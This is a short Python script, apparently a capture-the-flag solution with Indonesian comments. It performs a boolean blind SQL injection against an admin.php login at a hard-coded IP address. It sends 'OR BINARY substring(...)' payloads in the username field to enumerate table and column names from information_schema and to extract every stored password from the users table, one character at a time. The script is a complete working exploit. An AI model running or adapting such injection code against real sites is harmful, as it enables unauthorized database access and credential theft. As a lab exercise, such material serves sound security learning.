import requests
from bs4 import BeautifulSoup
import string
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);", 
   "Content-Type": "application/x-www-form-urlencoded",
   "Origin": "http://103.145.226.170:1000/admin.php",
   "Referer": "http://103.145.226.170:1000/admin.php"
}
strs = string.printable[:-5]
namaDatabase = ""

for i in range(1,30):
    for j in strs:
        url = "http://103.145.226.170:1000/admin.php"
        #  table name --> users
        #  database --> pramsworld
        # check database --> subtring(database(),1,1) = 
        # BINARY substring((select tabel_name from information_schema.tables where table_schema = "'database yang didapat'"),1,1)=j -- 
        # username = f"asdfsf' OR BINARY substring((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='pramsworld' AND table_name='users'),{i},1)='{j}'-- "
        username = f"asdfsf' OR BINARY substring((SELECT group_concat(password) FROM users),{i},1)='{j}'-- "
        passwd = "kosong"
        payload = {"username": username,"password": passwd}
        r = requests.post(url,data=payload,headers=headers)
        soup = BeautifulSoup(r.text,"lxml")
        if "KSL2020{bj11rrrr__h3mk3rrRR2376172}" in soup.text:
            namaDatabase += j
            print("[+]Didapat --> "+namaDatabase)
            break
        # else: 
        #     print("gagal")
print(namaDatabase)